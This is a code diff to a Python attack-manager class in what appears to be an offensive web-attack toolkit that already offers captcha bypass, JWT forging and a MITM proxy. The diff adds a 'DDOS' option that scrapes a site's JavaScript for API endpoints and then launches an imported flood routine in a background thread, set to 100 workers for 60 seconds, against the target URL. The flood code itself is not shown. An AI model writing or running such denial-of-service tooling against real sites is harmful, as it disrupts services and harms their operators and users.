@@ -13,6 +13,7 @@ from Attacks.Alexis.CaptchaBypass import CaptchaBypass
 from Attacks.APIScrapper import APIScrapper
 from Attacks.APITest import APITester
 from Attacks.PwnedChecker import PwnedChecker
+from Attacks.ddos import start_ddos
 
 class AttackManager:
     def __init__(self):
@@ -25,7 +26,8 @@ class AttackManager:
             "API Tester": Attack("API Tester", AttackType.DIRECT, self._run_api_tester),
             "Unsigned JWT": Attack("Unsigned JWT", AttackType.PROXY, self._run_unsigned_jwt),
             "Signed JWT": Attack("Signed JWT", AttackType.PROXY, self._run_signed_jwt),
-            "Launch MITM Proxy": Attack("Launch MITM Proxy", AttackType.PROXY, self._run_mitm_proxy)
+            "Launch MITM Proxy": Attack("Launch MITM Proxy", AttackType.PROXY, self._run_mitm_proxy),
+            "DDOS": Attack("DDOS", AttackType.DIRECT, self._run_DDOS),
         }
         
     @property
@@ -95,6 +97,13 @@ class AttackManager:
             checker.check_email(email)
             checker.check_password(password)
 
+    def _run_DDOS(self, url: str, use_proxy: bool = False, callback: Callable = None):
+        scanner = APIScrapper(callback)
+        if use_proxy:
+            scanner.set_proxy("http://127.0.0.1:8080")
+        scanner.find_js_endpoints(url)
+        api_endpoints = scanner.get_api_endpoints()
+        threading.Thread(target=start_ddos, args=(url, api_endpoints, 100, 60, callback)).start() # Run attack in background
 
     def _run_unsigned_jwt(self, url: str, use_proxy: bool = True, callback: Callable = None):
         if not self._proxy_running:
